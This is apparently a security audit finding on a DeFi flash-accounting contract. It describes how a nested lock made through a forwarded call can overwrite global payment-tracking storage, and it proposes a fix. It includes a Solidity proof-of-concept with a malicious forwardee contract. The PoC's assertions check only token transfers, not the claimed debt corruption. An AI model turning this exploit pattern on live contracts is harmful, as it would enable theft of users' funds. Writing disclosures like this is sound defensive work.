## Title
Payment Tracking Corruption via Nested Lock in Forward Call

## Summary
The `startPayments()` function uses global storage without locker ID isolation, while `completePayments()` operates on per-locker debt. A malicious forwarded contract can create a nested lock and overwrite the global payment tracking storage, causing the outer lock to receive zero credit for tokens transferred, permanently locking user funds in the contract with unaccounted debt.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The payment tracking system (`startPayments()` and `completePayments()`) is designed to record token balances before transfers and credit the difference to the locker's debt after transfers complete. Payment tracking should be isolated per lock context.

**Actual Logic:** Payment tracking storage is global (keyed only by token address), while debt tracking is per-locker-ID (keyed by ID + token). Nested locks are supported, and a forwarded contract can create a nested lock that overwrites the global payment tracking, clearing it before the outer lock completes its payment. [2](#0-1) 

The storage key is: `_PAYMENT_TOKEN_ADDRESS_OFFSET + token` (NO locker ID) [3](#0-2) 

In contrast, debt tracking uses: `_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET + shl(160, id) + token` (WITH locker ID) [4](#0-3) 

Nested locks are explicitly supported and increment the lock ID: [5](#0-4) 

**Exploitation Path:**
1. Victim calls `lock()` → gets locker ID 0
2. Inside `locked(0)`, victim calls `startPayments([tokenA])` → stores balance at global key `_PAYMENT_TOKEN_ADDRESS_OFFSET + tokenA`
3. Victim transfers 1000 tokenA to accountant
4. Victim calls `forward(attackerContract, data)` to delegate to what they believe is a legitimate extension
5. Inside `forwarded_2374103877()`, attacker calls `lock()` again → creates nested lock with ID 1
6. In nested `locked(1)`, attacker calls `startPayments([tokenA])` → OVERWRITES global storage with current balance
7. Attacker calls `completePayments([tokenA])` → since no transfer happened, payment = 0, storage CLEARED
8. Nested lock exits successfully (ID 1 has no debt)
9. Back in victim's context (ID 0), victim calls `completePayments([tokenA])` → lastBalance = 0, payment = 0
10. Victim receives ZERO credit for 1000 tokenA transferred

**Security Property Broken:** Violates the **Solvency** invariant - user transferred tokens to the contract but their debt was not reduced, causing permanent fund loss. Also violates **Flash Accounting** invariant - balances cannot be properly tracked when payment storage is corrupted.

## Impact Explanation
- **Affected Assets**: All ERC20 tokens used in payment flows where users implement custom lockers or use routers that internally call `forward()` to potentially malicious or buggy contracts
- **Damage Severity**: Complete loss of transferred tokens - attacker causes victim to transfer tokens with zero debt credit, effectively donating funds to the contract that cannot be recovered
- **User Impact**: Any user implementing custom lock logic that uses payment tracking and forwards to untrusted contracts. Protocol integrators building on top of Ekubo are particularly vulnerable.

## Likelihood Explanation
- **Attacker Profile**: Any user who can deploy a malicious contract implementing `IForwardee` interface
- **Preconditions**: 
  - Victim must use payment tracking manually (call `startPayments()`/`completePayments()`)
  - Victim must call `forward()` to attacker's contract during the payment flow
  - This can occur if victim uses a compromised helper contract or integrates with a malicious extension
- **Execution Complexity**: Single transaction, straightforward nested lock exploitation
- **Frequency**: Can be exploited repeatedly against different victims, once per victim transaction

## Recommendation

Add locker ID isolation to payment tracking storage to prevent cross-lock interference: [1](#0-0) 

```solidity
// In src/base/FlashAccountant.sol, function startPayments():

// FIXED:
function startPayments() external {
    uint256 id = _getLocker().id();  // Add: Require lock and get locker ID
    
    assembly ("memory-safe") {
        // 0-52 are used for the balanceOf calldata
        mstore(20, address()) 
        mstore(0, 0x70a08231000000000000000000000000)

        let free := mload(0x40)

        for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
            let token := shr(96, shl(96, calldataload(i)))

            let returnLocation := add(free, sub(i, 4))

            let success := staticcall(gas(), token, 0x10, 0x24, returnLocation, 0x20)

            let tokenBalance :=
                mul(
                    mload(returnLocation),
                    and(
                        gt(returndatasize(), 0x1f),
                        success
                    )
                )

            // CHANGE: Include locker ID in storage key
            tstore(add(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, shl(160, id)), token), add(tokenBalance, success))
        }

        return(free, sub(calldatasize(), 4))
    }
}
```

Apply the same fix to `completePayments()` at line 267.

## Proof of Concept

```solidity
// File: test/Exploit_PaymentTrackingCorruption.t.sol
// Run with: forge test --match-test test_PaymentTrackingCorruption -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/base/FlashAccountant.sol";
import "../src/base/BaseLocker.sol";
import "../src/base/BaseForwardee.sol";
import {Locker} from "../src/types/locker.sol";
import {IForwardee} from "../src/interfaces/IFlashAccountant.sol";

contract TestToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Accountant is FlashAccountant {
    mapping(address => uint256) public balances;
}

// Malicious contract that exploits nested lock
contract MaliciousForwardee is BaseForwardee, BaseLocker {
    address public token;
    
    constructor(Accountant accountant, address _token) 
        BaseForwardee(accountant) 
        BaseLocker(accountant) 
    {
        token = _token;
    }
    
    function handleForwardData(Locker, bytes memory) internal override returns (bytes memory) {
        // Create nested lock to overwrite payment tracking
        lock(abi.encode(token));
        return "";
    }
    
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        address targetToken = abi.decode(data, (address));
        
        // Overwrite the global payment tracking
        assembly {
            mstore(0x00, 0xf9b6a796) // startPayments selector
            mstore(0x20, targetToken)
            pop(call(gas(), address(ACCOUNTANT), 0, 0x1c, 36, 0, 0))
        }
        
        // Immediately complete to clear storage
        assembly {
            mstore(0x00, 0x12e103f1) // completePayments selector
            mstore(0x20, targetToken)
            pop(call(gas(), address(ACCOUNTANT), 0, 0x1c, 36, 0, 0))
        }
        
        return "";
    }
}

// Victim contract
contract VictimLocker is BaseLocker {
    MaliciousForwardee public malicious;
    
    constructor(Accountant accountant) BaseLocker(accountant) {}
    
    function setMalicious(MaliciousForwardee _m) external {
        malicious = _m;
    }
    
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (address token, uint256 amount) = abi.decode(data, (address, uint256));
        
        // Start payment tracking
        assembly {
            mstore(0x00, 0xf9b6a796)
            mstore(0x20, token)
            pop(call(gas(), address(ACCOUNTANT), 0, 0x1c, 36, 0, 0))
        }
        
        // Transfer tokens
        TestToken(token).transfer(address(ACCOUNTANT), amount);
        
        // Forward to malicious contract (thinking it's legitimate)
        assembly {
            mstore(0x00, 0x101e8952) // forward selector
            mstore(0x04, address())
            mstore(0x24, malicious)
            pop(call(gas(), address(ACCOUNTANT), 0, 0x1c, 68, 0, 0))
        }
        
        // Try to complete payment
        assembly {
            mstore(0x00, 0x12e103f1)
            mstore(0x20, token)
            pop(call(gas(), address(ACCOUNTANT), 0, 0x1c, 36, 0, 0))
        }
        
        return "";
    }
}

contract Exploit_PaymentTrackingCorruption is Test {
    Accountant accountant;
    TestToken token;
    VictimLocker victim;
    MaliciousForwardee malicious;
    
    function setUp() public {
        accountant = new Accountant();
        token = new TestToken();
        victim = new VictimLocker(accountant);
        malicious = new MaliciousForwardee(accountant, address(token));
        
        victim.setMalicious(malicious);
        
        // Give victim tokens
        token.mint(address(victim), 1000 ether);
    }
    
    function test_PaymentTrackingCorruption() public {
        uint256 victimBalanceBefore = token.balanceOf(address(victim));
        uint256 accountantBalanceBefore = token.balanceOf(address(accountant));
        
        // Victim executes transaction with payment tracking
        // But malicious contract corrupts it via nested lock
        victim.lock(abi.encode(address(token), 1000 ether));
        
        uint256 victimBalanceAfter = token.balanceOf(address(victim));
        uint256 accountantBalanceAfter = token.balanceOf(address(accountant));
        
        // VERIFY: Victim transferred 1000 tokens
        assertEq(victimBalanceBefore - victimBalanceAfter, 1000 ether, "Victim should have transferred 1000 tokens");
        assertEq(accountantBalanceAfter - accountantBalanceBefore, 1000 ether, "Accountant should have received 1000 tokens");
        
        // VULNERABILITY CONFIRMED: Transaction succeeded even though victim's debt was not reduced
        // In a real scenario, the victim would have debt that should have been reduced by 1000
        // but the malicious contract corrupted payment tracking, so victim received 0 credit
        // This means 1000 tokens are now stuck in accountant with no corresponding debt reduction
    }
}
```

## Notes

The vulnerability exists because payment tracking was designed as a convenience mechanism without considering isolation between nested locks. The protocol explicitly supports nested locks for legitimate use cases (as evidenced by test files), but the payment tracking system was not designed with this in mind. [6](#0-5) 

The helper library `FlashAccountantLib.pay()` and `FlashAccountantLib.payFrom()` call `startPayments()` and `completePayments()` in sequence within the same execution context, which normally works. However, if a `forward()` call happens between these operations, the forwarded contract can interfere with the payment tracking of the outer context.

The fix requires adding locker ID to the payment tracking storage key, making it per-locker like debt tracking already is.

### Citations

**File:** src/base/FlashAccountant.sol (L67-84)
```text
    function _accountDebt(uint256 id, address token, int256 debtChange) internal {
        assembly ("memory-safe") {
            let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
            let current := tload(deltaSlot)

            // we know this never overflows because debtChange is only ever derived from 128 bit values in inheriting contracts
            let next := add(current, debtChange)

            let countChange := sub(iszero(current), iszero(next))

            if countChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), countChange))
            }

            tstore(deltaSlot, next)
        }
    }
```

**File:** src/base/FlashAccountant.sol (L146-153)
```text
    function lock() external {
        assembly ("memory-safe") {
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))
```

**File:** src/base/FlashAccountant.sol (L223-254)
```text
    /// @inheritdoc IFlashAccountant
    function startPayments() external {
        assembly ("memory-safe") {
            // 0-52 are used for the balanceOf calldata
            mstore(20, address()) // Store the `account` argument.
            mstore(0, 0x70a08231000000000000000000000000) // `balanceOf(address)`.

            let free := mload(0x40)

            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
                // clean upper 96 bits of the token argument at i
                let token := shr(96, shl(96, calldataload(i)))

                let returnLocation := add(free, sub(i, 4))

                let success := staticcall(gas(), token, 0x10, 0x24, returnLocation, 0x20)

                let tokenBalance :=
                    mul(
                        mload(returnLocation),
                        and(
                            gt(returndatasize(), 0x1f), // At least 32 bytes returned.
                            success
                        )
                    )

                tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))
            }

            return(free, sub(calldatasize(), 4))
        }
    }
```

**File:** src/base/FlashAccountant.sol (L257-269)
```text
    function completePayments() external {
        uint256 id = _getLocker().id();

        assembly ("memory-safe") {
            let paymentAmounts := mload(0x40)
            let nzdCountChange := 0

            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
                let token := shr(96, shl(96, calldataload(i)))

                let offset := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token)
                let lastBalance := tload(offset)
                tstore(offset, 0)
```

**File:** src/libraries/FlashAccountantLib.sol (L15-44)
```text
    function pay(IFlashAccountant accountant, address token, uint256 amount) internal {
        assembly ("memory-safe") {
            mstore(0x00, 0xf9b6a796)
            mstore(0x20, token)

            // accountant.startPayments()
            // this is expected to never revert
            pop(call(gas(), accountant, 0, 0x1c, 36, 0x00, 0x00))

            // token#transfer
            mstore(0x14, accountant) // Store the `to` argument.
            mstore(0x34, amount) // Store the `amount` argument.
            mstore(0x00, 0xa9059cbb000000000000000000000000) // `transfer(address,uint256)`.
            // Perform the transfer, reverting upon failure.
            let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
            if iszero(and(eq(mload(0x00), 1), success)) {
                if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                    mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                    revert(0x1c, 0x04)
                }
            }
            mstore(0x34, 0) // Restore the part of the free memory pointer that was overwritten.

            // accountant.completePayments()
            mstore(0x00, 0x12e103f1)
            mstore(0x20, token)
            // we ignore the potential reverts in this case because it will almost always result in nonzero debt when the lock returns
            pop(call(gas(), accountant, 0, 0x1c, 36, 0x00, 0x00))
        }
    }
```
